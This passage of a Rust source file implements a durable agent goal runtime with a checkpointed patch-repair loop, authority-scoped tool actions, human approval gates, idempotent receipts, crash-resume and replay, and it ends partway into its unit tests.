//! The durable goal runtime.
//!
//! This is the layer that turns the deterministic repair loop into something a
//! long-horizon agent can lean on: a run that is *budgeted*, *authority-scoped*,
//! *checkpointed*, *resumable*, and *replayable*. It reuses the exact same repair
//! leaves as `tach fix` — collect the diagnostics, pick the next one, build its
//! typed patch, verify it through the pipeline — but wraps each step in an event,
//! a checkpoint, and a policy gate derived from the goal's `allow` block.
//!
//! The single most important property: **resume never duplicates work.** A
//! checkpoint captures the post-step workspace, so picking up from it continues
//! with only the diagnostics that remain. A run can crash after any step and
//! resume to exactly where it left off.

use crate::action::{self, ActionPlan};
use crate::agent::{self, Strategy};
use crate::event::{kind, EventLog};
use crate::goal::GoalSpec;
use crate::patch::{verify_patch, VerifyOpts, Workspace};
use crate::store::{self, events_path, Approval, Checkpoint, GoalRecord, Receipt, RunState};
use serde_json::json;
use std::collections::BTreeMap;
use std::io;
use std::path::Path;

/// The result of driving (or partially driving) a run.
pub struct RunResult {
    pub state: RunState,
    pub final_files: BTreeMap<String, String>,
    /// True when the run stopped on a simulated crash (`--crash-after`) rather
    /// than reaching a terminal status. The durable state is fully persisted; the
    /// run is resumable.
    pub crashed: bool,
    /// True when an action run stopped at an approval gate. Not a crash and not a
    /// terminal status — the run is healthy and waiting for `tach goal approve`.
    pub paused: bool,
}

/// Where to inject a simulated crash in an action run. `Step(n)` crashes right after
/// the durable transition that brings `state.step` to `n` (this is what the CLI's
/// `--crash-after step:N` maps to). `AfterReceipt(n)` is a test-only hook that crashes
/// in the *intra-action danger window* — after the `n`th receipt is written but before
/// the cursor advances — to prove resume reuses the receipt instead of re-invoking.
#[derive(Clone, Copy, Debug)]
pub enum ActionCrash {
    Step(u64),
    AfterReceipt(u64),
}

/// Map a stored strategy label back to its `Strategy`.
pub fn strategy_from_label(label: &str) -> Strategy {
    match label {
        "convert" => Strategy::Convert,
        "strict" => Strategy::Strict,
        _ => Strategy::Minimal,
    }
}

/// The outcome of evaluating one step against the current workspace. This is the
/// shared core both the durable driver and the pure replay simulator consume, so
/// the two can never diverge in *what* they decide — only in whether they persist.
enum StepOutcome {
    /// Success: no errors remain and the goal's success conditions hold.
    Done { passed: usize, failed: usize },
    /// No actionable diagnostic — deterministic repair is out of moves.
    NoAction {
        errors: usize,
        passed: usize,
        failed: usize,
    },
    /// A patch was proposed and verified (accepted or not). Boxed because it is by
    /// far the largest variant and dwarfs the two terminal ones.
    Patch(Box<StepPatch>),
}

/// The detail of a proposed-and-verified step.
struct StepPatch {
    accepted: bool,
    new_ws: Workspace,
    diag: agent::DiagSummary,
    patch: agent::PatchSummary,
    verdict: agent::VerdictSummary,
    new_effects: Vec<String>,
    rejections: Vec<String>,
    regressed: bool,
    tests_run: usize,
    diff_chars: usize,
}

/// Evaluate exactly one repair step under a goal's authority. Pure — it reads the
/// workspace and returns a decision, touching neither disk nor the event log.
fn step_once(ws: &Workspace, spec: &GoalSpec, strategy: Strategy) -> StepOutcome {
    let (errors, warnings, report) = agent::collect_problems(ws);
    let require_tests = spec.requires_tests_pass();
    let success = errors.is_empty() && (!require_tests || report.all_green());
    if success {
        return StepOutcome::Done {
            passed: report.passed,
            failed: report.failed,
        };
    }
    let diag = match agent::pick_candidate(&errors, &warnings, strategy) {
        Some(d) => d,
        None => {
            return StepOutcome::NoAction {
                errors: errors.len(),
                passed: report.passed,
                failed: report.failed,
            }
        }
    };
    let patch = agent::build_patch(diag, strategy, ws);
    let opts = VerifyOpts {
        allow_new_effects: false,
        forbid_api_break: false,
        allowed_effects: Some(spec.allowed_effects()),
        allowed_writes: spec.allowed_writes(),
    };
    let verdict = verify_patch(ws, &patch, &opts);
    let regressed = verdict.rejections.iter().any(|r| r.contains("regressed"));
    let diff_chars = patch.edits.iter().map(|e| e.replacement.len()).sum();
    StepOutcome::Patch(Box::new(StepPatch {
        accepted: verdict.accepted,
        new_ws: if verdict.accepted {
            verdict.workspace.clone()
        } else {
            ws.clone()
        },
        diag: agent::diag_summary(diag, ws),
        patch: agent::patch_summary(&patch),
        verdict: agent::verdict_summary(&verdict),
        new_effects: verdict.new_effects.clone(),
        rejections: verdict.rejections.clone(),
        regressed,
        tests_run: verdict.tests_run(),
        diff_chars,
    }))
}

/// Start a brand-new run: persist the goal record, open a fresh event log, and
/// drive to a terminal status (or a simulated crash).
pub fn start_run(
    repo: &Path,
    spec: GoalSpec,
    base: Workspace,
    strategy: Strategy,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    // A fingerprint identifies the *goal over this source*; a run id identifies
    // *this run instance*. Allocating from the fingerprint guarantees a fresh run
    // never collides with — or overwrites — a previous run's durable history.
    let fingerprint = store::fingerprint(&spec.name, &base.files);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: strategy.label().to_string(),
        base_files: base.files.clone(),
        kind: "repair".into(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "strategy": strategy.label(),
            "budget": { "steps": spec.step_budget(), "retries": spec.retry_budget() },
        }),
    )?;
    log.append(
        kind::WORKSPACE_LOADED,
        json!({ "files": base.files.keys().collect::<Vec<_>>() }),
    )?;

    let state = RunState {
        run_id: run_id.clone(),
        goal: spec.name.clone(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
        kind: "repair".into(),
        cursor: 0,
        pending_approval: None,
        actions_executed: 0,
        receipts_created: 0,
    };
    store::save_state(repo, &state)?;

    drive(repo, &spec, strategy, base, state, &mut log, crash_after)
}

/// Resume a previously-crashed (or merely incomplete) run from its last
/// checkpoint, continuing the same event log.
pub fn resume_run(repo: &Path, run_id: &str, crash_after: Option<u64>) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    if record.kind == "action" {
        // The CLI only exposes step-boundary crashes; the receipt-window hook is test-only.
        return resume_action_run(repo, run_id, crash_after.map(ActionCrash::Step));
    }
    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut state = store::load_state(repo, run_id)?;

    let mut ws = Workspace::new();
    match store::load_latest_checkpoint(repo, run_id) {
        Ok(cp) => {
            for (k, v) in &cp.files {
                ws.insert(k.clone(), v.clone());
            }
        }
        Err(_) => {
            for (k, v) in &record.base_files {
                ws.insert(k.clone(), v.clone());
            }
        }
    }

    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_RESUMED, json!({ "from_step": state.step }))?;
    state.status = "running".into();
    drive(repo, &spec, strategy, ws, state, &mut log, crash_after)
}

/// The durable loop. Each iteration: enforce the step budget, evaluate one step,
/// emit its events, checkpoint, and persist state. A `crash_after` returns early
/// without finalizing — leaving a resumable run behind.
fn drive(
    repo: &Path,
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
    mut state: RunState,
    log: &mut EventLog,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();

    loop {
        // Budget gate first: a run that has spent its steps without succeeding is
        // exhausted, full stop.
        if state.step >= step_budget {
            let (errors, _w, report) = agent::collect_problems(&ws);
            state.status = "budget_exhausted".into();
            state.final_errors = errors.len();
            state.tests_passed = report.passed;
            state.tests_failed = report.failed;
            log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "steps": state.step, "limit": step_budget }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(RunResult {
                state,
                final_files: ws.files,
                crashed: false,
                paused: false,
            });
        }

        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { passed, failed } => {
                state.status = "completed".into();
                state.final_errors = 0;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_COMPLETED,
                    json!({ "steps": state.step, "patches_applied": state.patches_applied, "tests_passed": passed }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                    paused: false,
                });
            }
            StepOutcome::NoAction {
                errors,
                passed,
                failed,
            } => {
                state.status = "failed".into();
                state.final_errors = errors;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_FAILED,
                    json!({ "reason": "no actionable diagnostic — needs a model-backed coder", "errors": errors }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                    paused: false,
                });
            }
            StepOutcome::Patch(p) => {
                let StepPatch {
                    accepted,
                    new_ws,
                    diag,
                    patch,
                    verdict,
                    new_effects,
                    rejections,
                    regressed,
                    tests_run,
                    diff_chars,
                } = *p;
                let next_step = state.step + 1;
                state.tests_run += tests_run;
                if regressed {
                    state.regressions += 1;
                }
                log.append(
                    kind::DIAGNOSTIC_EMITTED,
                    serde_json::to_value(&diag).unwrap_or_default(),
                )?;
                log.append(
                    kind::PATCH_PROPOSED,
                    serde_json::to_value(&patch).unwrap_or_default(),
                )?;
                if !new_effects.is_empty() {
                    log.append(
                        kind::EFFECT_DELTA_DETECTED,
                        json!({ "new_effects": new_effects }),
                    )?;
                }

                if accepted {
                    state.patches_applied += 1;
                    state.diff_chars += diff_chars;
                    state.consecutive_rejections = 0;
                    ws = new_ws;
                    log.append(
                        kind::PATCH_VERIFIED,
                        serde_json::to_value(&verdict).unwrap_or_default(),
                    )?;
                    log.append(kind::PATCH_APPLIED, json!({ "patch": patch.name }))?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                } else {
                    state.patches_rejected += 1;
                    state.consecutive_rejections += 1;
                    log.append(
                        kind::PATCH_REJECTED,
                        json!({ "patch": patch.name, "rejections": rejections }),
                    )?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                }

                // Advance and checkpoint — this step is now durable.
                state.step = next_step;
                let cp = Checkpoint {
                    step: next_step,
                    status: "running".into(),
                    files: ws.files.clone(),
                    consecutive_rejections: state.consecutive_rejections,
                    patches_applied: state.patches_applied,
                    patches_rejected: state.patches_rejected,
                    tests_run: state.tests_run,
                    regressions: state.regressions,
                    diff_chars: state.diff_chars,
                };
                store::save_checkpoint(repo, &run_id, &cp)?;
                log.append(kind::CHECKPOINT_WRITTEN, json!({ "step": next_step }))?;
                store::save_state(repo, &state)?;

                // Simulated crash: stop here, fully durable, without finalizing.
                if crash_after == Some(next_step) {
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: true,
                        paused: false,
                    });
                }

                // Out of retries on a stubborn rejection: give up cleanly.
                if !accepted && state.consecutive_rejections > retry_budget {
                    let (errors, _w, report) = agent::collect_problems(&ws);
                    state.status = "failed".into();
                    state.final_errors = errors.len();
                    state.tests_passed = report.passed;
                    state.tests_failed = report.failed;
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "retry budget exhausted", "rejections": state.patches_rejected }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: false,
                        paused: false,
                    });
                }
            }
        }
    }
}

/// Mark a run cancelled. Idempotent; records a `run.cancelled` event.
pub fn cancel_run(repo: &Path, run_id: &str) -> io::Result<RunState> {
    let mut state = store::load_state(repo, run_id)?;
    if state.status == "completed" || state.status == "cancelled" {
        return Ok(state);
    }
    state.status = "cancelled".into();
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_CANCELLED, json!({ "at_step": state.step }))?;
    store::save_state(repo, &state)?;
    Ok(state)
}

/// The result of a deterministic replay.
pub struct ReplayResult {
    pub recorded_status: String,
    pub replayed_status: String,
    pub identical: bool,
    pub steps: u64,
}

/// Re-run a recorded goal from its base source, with no persistence and no crash,
/// and prove it reproduces the recorded final state byte-for-byte.
pub fn replay_run(repo: &Path, run_id: &str) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    if record.kind == "action" {
        return replay_action_run(repo, run_id);
    }
    let recorded = store::load_state(repo, run_id)?;
    let recorded_files = store::load_latest_checkpoint(repo, run_id)
        .map(|cp| cp.files)
        .unwrap_or_else(|_| record.base_files.clone());

    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut ws = Workspace::new();
    for (k, v) in &record.base_files {
        ws.insert(k.clone(), v.clone());
    }
    let (status, files, steps) = simulate(&spec, strategy, ws);

    let identical = status == recorded.status && files == recorded_files;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps,
    })
}

/// The pure replay loop: the same decisions as `drive`, with no I/O. Returns the
/// terminal status, the final workspace files, and the number of steps taken.
fn simulate(
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
) -> (String, BTreeMap<String, String>, u64) {
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();
    let mut step = 0u64;
    let mut consec = 0u64;
    loop {
        if step >= step_budget {
            return ("budget_exhausted".into(), ws.files, step);
        }
        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { .. } => return ("completed".into(), ws.files, step),
            StepOutcome::NoAction { .. } => return ("failed".into(), ws.files, step),
            StepOutcome::Patch(p) => {
                step += 1;
                if p.accepted {
                    ws = p.new_ws;
                    consec = 0;
                } else {
                    consec += 1;
                    if consec > retry_budget {
                        return ("failed".into(), ws.files, step);
                    }
                }
            }
        }
    }
}

// ============================================================================
// Action Layer runtime
// ============================================================================
//
// A business goal runs a fixed `ActionPlan` instead of repairing source. Its own
// driver (`drive_actions`) reuses the same durable substrate — run ids, the append-
// only event log, `state.json` — but its unit of work is "invoke a tool and write a
// receipt", not "verify a typed patch", so it does not share `drive`/`step_once`.
//
// The single correctness invariant: **advancing the cursor and saving state is the
// sole commit that moves past an action / clears an approval gate.** The approval
// file's status and the receipts dir are the durable truth; `RunState.status` is
// cosmetic. Every crash window then resolves safely (see `drive_actions`).

/// A `RunResult` for an action run, which has no workspace to write back.
fn action_result(state: RunState, crashed: bool, paused: bool) -> RunResult {
    RunResult {
        state,
        final_files: BTreeMap::new(),
        crashed,
        paused,
    }
}

/// Start a brand-new action run from a built-in goal's spec + plan.
pub fn start_action_run(
    repo: &Path,
    spec: GoalSpec,
    plan: ActionPlan,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let base: BTreeMap<String, String> = BTreeMap::new();
    let fingerprint = store::fingerprint(&spec.name, &base);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: "action".into(),
        base_files: base,
        kind: "action".into(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "kind": "action",
            "budget": { "steps": spec.step_budget() },
            "tools": spec.allow.tools,
            "actions": plan.steps.len(),
        }),
    )?;

    let state = RunState {
        run_id: run_id.clone(),
        goal: spec.name.clone(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
        kind: "action".into(),
        cursor: 0,
        pending_approval: None,
        actions_executed: 0,
        receipts_created: 0,
    };
    store::save_state(repo, &state)?;

    drive_actions(repo, &spec, &plan, state, &mut log, crash)
}

/// Resume an action run from `state.json` (its cursor) — there are no checkpoints to
/// load; the cursor + approvals + receipts dirs are the durable state. The plan is
/// re-derived from the catalog by goal name.
pub fn resume_action_run(
    repo: &Path,
    run_id: &str,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    let spec = record.spec;
    let (_, plan) = action::builtin_action_goal(&spec.name).ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::NotFound,
            format!("no built-in action goal `{}` to resume", spec.name),
        )
    })?;
    let state = store::load_state(repo, run_id)?;
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(
        kind::RUN_RESUMED,
        json!({ "from_step": state.step, "cursor": state.cursor }),
    )?;
    // Leave `status` as recorded (`awaiting_approval` or `running`); the driver
    // resolves the gate from the approval file, never from a second status flag.
    drive_actions(repo, &spec, &plan, state, &mut log, crash)
}

/// The durable action loop. See the module comment for the crash-safety invariant.
fn drive_actions(
    repo: &Path,
    spec: &GoalSpec,
    plan: &ActionPlan,
    mut state: RunState,
    log: &mut EventLog,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let step_budget = spec.step_budget();
    let tools = spec.allowed_tools();

    loop {
        // Budget gate bills the CURSOR (plan progress), not raw iterations — so an
        // approval pause or an idempotent re-entry never burns budget, and a granted
        // gate (cursor already below budget) is never voided on resume.
        if state.cursor >= step_budget {
            state.status = "budget_exhausted".into();
            log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "actions": state.cursor, "limit": step_budget }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        let idx = state.cursor as usize;
        if idx >= plan.steps.len() {
            state.status = "completed".into();
            log.append(
                kind::RUN_COMPLETED,
                json!({
                    "steps": state.step,
                    "actions_executed": state.actions_executed,
                    "receipts": state.receipts_created,
                }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        let action = &plan.steps[idx];

        // Authority FIRST, every iteration, for read and effectful actions alike: a
        // plan can only ever call what the goal's `allow` block grants. No ambient
        // authority — the check runs even on the post-approval execute path.
        if !tools.contains(&action.tool) {
            state.status = "failed".into();
            log.append(
                kind::RUN_FAILED,
                json!({
                    "reason": format!("tool `{}` is outside the goal's authority", action.tool),
                    "action": action.id,
                }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        // Approval gate — the approval file's status is the durable truth.
        if action.requires_approval {
            let apr_id = store::approval_id(&run_id, &action.id);
            let status = store::load_approval(repo, &run_id, &apr_id)
                .ok()
                .map(|a| a.status);
            match status.as_deref() {
                None => {
                    // First reach: propose + request approval, then PAUSE. The cursor
                    // is NOT advanced — re-entry on resume sees the pending file.
                    let approval = Approval {
                        id: apr_id.clone(),
                        action_id: action.id.clone(),
                        tool: action.tool.clone(),
                        summary: action.summary.clone(),
                        status: "pending".into(),
                        note: None,
                    };
                    store::save_approval(repo, &run_id, &approval)?;
                    log.append(
                        kind::ACTION_PROPOSED,
                        json!({
                            "action": action.id,
                            "tool": action.tool,
                            "summary": action.summary,
                            "input": action.input,
                        }),
                    )?;
                    log.append(
                        kind::APPROVAL_REQUESTED,
                        json!({ "approval_id": apr_id, "action": action.id, "tool": action.tool }),
                    )?;
                    state.pending_approval = Some(apr_id);
                    state.status = "awaiting_approval".into();
                    state.step += 1;
                    store::save_state(repo, &state)?;
                    if matches!(crash, Some(ActionCrash::Step(n)) if n == state.step) {
                        return Ok(action_result(state, true, false));
                    }
                    return Ok(action_result(state, false, true));
                }
                Some("pending") => {
                    state.status = "awaiting_approval".into();
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, true));
                }
                Some("denied") => {
                    log.append(
                        kind::ACTION_SKIPPED,
                        json!({ "action": action.id, "reason": "approval denied" }),
                    )?;
                    state.status = "denied".into();
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "approval denied", "action": action.id }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, false));
                }
                // "granted" (or any other resolved state) → fall through and execute.
                _ => {}
            }
        }

        // Execute. For effectful actions, the receipt is the commit point and the
        // idempotency scan makes re-entry safe.
        if action.effectful {
            let key = store::idempotency_key(&run_id, &action.id, &action.tool, &action.input);
            if let Some(existing) = store::find_receipt_by_key(repo, &run_id, &key) {
                // Already done in a prior (crashed) pass — never invoke twice.
                log.append(
                    kind::RECEIPT_REUSED,
                    json!({
                        "receipt_id": existing.receipt_id,
                        "idempotency_key": key,
                        "action": action.id,
                    }),
                )?;
                log.append(
                    kind::ACTION_SKIPPED,
                    json!({ "action": action.id, "reason": "receipt already exists" }),
                )?;
            } else {
                log.append(
                    kind::TOOL_CALLED,
                    json!({
                        "tool": action.tool,
                        "action": action.id,
                        "idempotency_key": key,
                        "input": action.input,
                    }),
                )?;
                match action::invoke_fake_tool(&action.tool, &action.input) {
                    Ok(output) => {
                        log.append(
                            kind::TOOL_COMPLETED,
                            json!({ "tool": action.tool, "action": action.id, "output": output }),
                        )?;
                        let rid = store::receipt_id(&key);
                        let receipt = Receipt {
                            receipt_id: rid.clone(),
                            idempotency_key: key.clone(),
                            action_id: action.id.clone(),
                            tool: action.tool.clone(),
                            input: action.input.clone(),
                            output,
                        };
                        store::save_receipt(repo, &run_id, &receipt)?; // <- COMMIT POINT
                        state.receipts_created += 1;
                        log.append(
                            kind::RECEIPT_CREATED,
                            json!({
                                "receipt_id": rid,
                                "tool": action.tool,
                                "action": action.id,
                                "idempotency_key": key,
                            }),
                        )?;
                        // Intra-action danger window (test-only): crash after the
                        // receipt is durable but before the cursor advances. Resume
                        // must reuse this receipt rather than refund twice.
                        if matches!(crash, Some(ActionCrash::AfterReceipt(n)) if n as usize == state.receipts_created)
                        {
                            store::save_state(repo, &state)?;
                            return Ok(action_result(state, true, false));
                        }
                    }
                    Err(e) => {
                        log.append(
                            kind::TOOL_FAILED,
                            json!({ "tool": action.tool, "action": action.id, "error": e }),
                        )?;
                        state.status = "failed".into();
                        log.append(
                            kind::RUN_FAILED,
                            json!({ "reason": "tool failed", "action": action.id }),
                        )?;
                        store::save_state(repo, &state)?;
                        return Ok(action_result(state, false, false));
                    }
                }
            }
            state.actions_executed += 1;
        } else {
            // Read-only action: invoke, record, no receipt.
            log.append(
                kind::TOOL_CALLED,
                json!({ "tool": action.tool, "action": action.id, "input": action.input }),
            )?;
            match action::invoke_fake_tool(&action.tool, &action.input) {
                Ok(output) => {
                    log.append(
                        kind::TOOL_COMPLETED,
                        json!({ "tool": action.tool, "action": action.id, "output": output }),
                    )?;
                }
                Err(e) => {
                    log.append(
                        kind::TOOL_FAILED,
                        json!({ "tool": action.tool, "action": action.id, "error": e }),
                    )?;
                    state.status = "failed".into();
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "tool failed", "action": action.id }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, false));
                }
            }
            state.actions_executed += 1;
        }

        // ADVANCE — the sole atomic commit past this action and any approval gate.
        state.cursor += 1;
        state.pending_approval = None;
        state.status = "running".into();
        state.step += 1;
        store::save_state(repo, &state)?;
        if matches!(crash, Some(ActionCrash::Step(n)) if n == state.step) {
            return Ok(action_result(state, true, false));
        }
    }
}

/// Replay an action run as a pure simulation. Reads the recorded human approvals from
/// the store (they are the run's non-deterministic *inputs*), re-invokes the
/// deterministic fake tools, and writes nothing. Determinism is proven by comparing
/// the simulated terminal status and the simulated receipt set (idempotency key →
/// output) against the recorded ones — **not** the event sequence, which legitimately
/// differs between a straight run and a crashed-then-resumed one.
pub fn replay_action_run(repo: &Path, run_id: &str) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    let spec = record.spec;
    let (_, plan) = action::builtin_action_goal(&spec.name).ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::NotFound,
            format!("no built-in action goal `{}` to replay", spec.name),
        )
    })?;
    let recorded = store::load_state(repo, run_id)?;
    let recorded_receipts: BTreeMap<String, serde_json::Value> = store::list_receipts(repo, run_id)
        .into_iter()
        .map(|r| (r.idempotency_key, r.output))
        .collect();

    let step_budget = spec.step_budget();
    let tools = spec.allowed_tools();
    let mut cursor = 0usize;
    let mut sim_receipts: BTreeMap<String, serde_json::Value> = BTreeMap::new();
    let mut status = "completed".to_string();

    while cursor < plan.steps.len() {
        if cursor as u64 >= step_budget {
            status = "budget_exhausted".into();
            break;
        }
        let action = &plan.steps[cursor];
        if !tools.contains(&action.tool) {
            status = "failed".into();
            break;
        }
        if action.requires_approval {
            let apr_id = store::approval_id(run_id, &action.id);
            match store::load_approval(repo, run_id, &apr_id)
                .ok()
                .map(|a| a.status)
                .as_deref()
            {
                Some("granted") => {}
                Some("denied") => {
                    status = "denied".into();
                    break;
                }
                _ => {
                    status = "awaiting_approval".into();
                    break;
                }
            }
        }
        if action.effectful {
            let key = store::idempotency_key(run_id, &action.id, &action.tool, &action.input);
            if let std::collections::btree_map::Entry::Vacant(slot) = sim_receipts.entry(key) {
                match action::invoke_fake_tool(&action.tool, &action.input) {
                    Ok(out) => {
                        slot.insert(out);
                    }
                    Err(_) => {
                        status = "failed".into();
                        break;
                    }
                }
            }
        } else if action::invoke_fake_tool(&action.tool, &action.input).is_err() {
            status = "failed".into();
            break;
        }
        cursor += 1;
    }

    let identical = status == recorded.status && sim_receipts == recorded_receipts;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps: cursor as u64,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::read_all;
    use crate::goal;
    use crate::program::Program;
    use crate::project::{DEMO_AUTH, DEMO_GOAL, DEMO_TEST};
    use crate::source::SourceFile;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// A throwaway repo directory, removed when the test ends.
    struct TempRepo(PathBuf);

    impl TempRepo {
        fn new(tag: &str) -> Self {
            static N: AtomicU64 = AtomicU64::new(0);
            let n = N.fetch_add(1, Ordering::Relaxed);
            let dir =
                std::env::temp_dir().join(format!("tach_rt_{}_{}_{}", std::process::id(), tag, n));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            TempRepo(dir)
        }
        fn path(&self) -> &Path {
            &self.0
        }
    }

    impl Drop for TempRepo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// The demo's broken auth project plus its goal, as a base workspace + spec.
    fn demo() -> (GoalSpec, Workspace) {
        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("goal.tach", DEMO_GOAL)]);
        assert!(
            diags.iter().all(|d| !d.is_error()),
            "goal must parse: {:?}",
            diags
        );
        let decl = goal::find_goal(&prog, "FixFailingTests").expect("demo goal");
        let spec = GoalSpec::from_decl(decl);
        let mut ws = Workspace::new();
        ws.insert("src/auth.tach", DEMO_AUTH);
        ws.insert("tests/auth_test.tach", DEMO_TEST);
        (spec, ws)
    }

    #[test]
    fn run_reaches_completed_and_writes_history() {
        let repo = TempRepo::new("complete");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "completed", "state: {:?}", r.state.status);
        assert_eq!(r.state.patches_applied, 3);
        assert_eq!(r.state.regressions, 0);
        assert_eq!(r.state.tests_failed, 0);

        // The event log records the whole run, terminated by run.completed.
        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::RUN_STARTED));
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3
        );
        assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        // Sequence numbers are contiguous from 1.
        for (i, e) in events.iter().enumerate() {
            assert_eq!(e.seq, i as u64 + 1);
            assert_eq!(e.schema, crate::event::EVENT_SCHEMA);
        }
    }

    #[test]
    fn crash_then_resume_does_not_duplicate_work() {
        let repo = TempRepo::new("resume");
        let (spec, ws) = demo();

        // Crash after the 2nd step. The run is durable but not finalized.
        let crashed = start_run(repo.path(), spec, ws, Strategy::Minimal, Some(2)).unwrap();
        assert!(crashed.crashed);
        assert_eq!(crashed.state.status, "running");
        assert_eq!(crashed.state.step, 2);
        assert_eq!(crashed.state.patches_applied, 2);
        let run_id = crashed.state.run_id.clone();

        // Resume picks up from the checkpoint and finishes.
        let resumed = resume_run(repo.path(), &run_id, None).unwrap();
        assert_eq!(resumed.state.status, "completed");
        // The total applied across the whole run is exactly 3 — the third patch
        // was applied once, on resume; the first two were NOT repeated.
        assert_eq!(
            resumed.state.patches_applied, 3,
            "resume must not duplicate patches"
        );

        // Exactly three patch.applied events exist across the entire history.
        let events = read_all(&store::events_path(repo.path(), &run_id)).unwrap();
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3,
            "history must show three applied patches, not more"
        );
        assert!(events.iter().any(|e| e.kind == kind::RUN_RESUMED));

        // The resumed run is byte-identical to an uninterrupted one.
        let repo2 = TempRepo::new("straight");
        let (spec2, ws2) = demo();
        let straight = start_run(repo2.path(), spec2, ws2, Strategy::Minimal, None).unwrap();
        assert_eq!(resumed.final_files, straight.final_files);
    }

    #[test]
    fn replay_reproduces_a_completed_run() {
        let repo = TempRepo::new("replay");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        let replay = replay_run(repo.path(), &r.state.run_id).unwrap();
        assert!(
            replay.identical,
            "replay diverged: {:?} vs {:?}",
            replay.recorded_status, replay.replayed_status
        );
        assert_eq!(replay.replayed_status, "completed");
    }

    #[test]
    fn fingerprint_is_deterministic_offline() {
        let (_, ws) = demo();
        let a = store::fingerprint("FixFailingTests", &ws.files);
        let b = store::fingerprint("FixFailingTests", &ws.files);
        assert_eq!(a, b);
        assert!(a.starts_with("run_"));
        // A different goal name yields a different fingerprint.
        assert_ne!(a, store::fingerprint("Other", &ws.files));
    }

    #[test]
